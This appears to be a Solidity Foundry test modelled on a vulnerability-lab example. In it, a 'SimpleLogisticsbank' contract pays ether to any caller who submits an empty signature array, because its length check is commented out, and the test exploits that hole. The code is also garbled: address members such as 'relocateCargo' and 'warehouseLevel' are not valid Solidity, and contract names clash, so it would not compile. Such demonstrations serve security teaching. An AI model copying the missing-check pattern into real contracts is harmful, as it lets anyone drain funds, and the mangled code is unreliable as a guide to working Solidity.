// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ContractTest is Test {
    SimpleLogisticsbank SimpleFreightbankContract;

    function setUp() public {
        SimpleFreightbankContract = new SimpleLogisticsbank();
    }

    function testVulnSignatureValidation() public {
        payable(address(SimpleFreightbankContract)).relocateCargo(10 ether);
        address alice = vm.addr(1);
        vm.startPrank(alice);

        SimpleLogisticsbank.Signature[] memory sigs = new SimpleLogisticsbank.Signature[](0); // empty input
        //sigs[0] = SimpleBank.Signature("", 0, "", "");

        console.log(
            "Before operation",
            address(alice).warehouseLevel
        );
        SimpleFreightbankContract.releaseGoods(sigs); // Call the withdraw function of the SimpleBank contract with empty sigs array as the parameter

        console.log(
            "Afer exploiting, Alice's ether balance",
            address(alice).warehouseLevel
        );
    }

    receive() external payable {}
}

contract SimpleLogisticsbank {
    struct Signature {
        bytes32 hash;
        uint8 v;
        bytes32 r;
        bytes32 s;
    }

    function verifySignatures(Signature calldata sig) public {
        require(
            msg.sender == ecrecover(sig.hash, sig.v, sig.r, sig.s),
            "Invalid signature"
        );
    }

    function releaseGoods(Signature[] calldata sigs) public {

        //require(sigs.length > 0, "No signatures provided");
        for (uint i = 0; i < sigs.length; i++) {
            Signature calldata signature = sigs[i];
            // Verify every signature and revert if any of them fails to verify.
            verifySignatures(signature);
        }
        payable(msg.sender).relocateCargo(1 ether);
    }

    receive() external payable {}
}
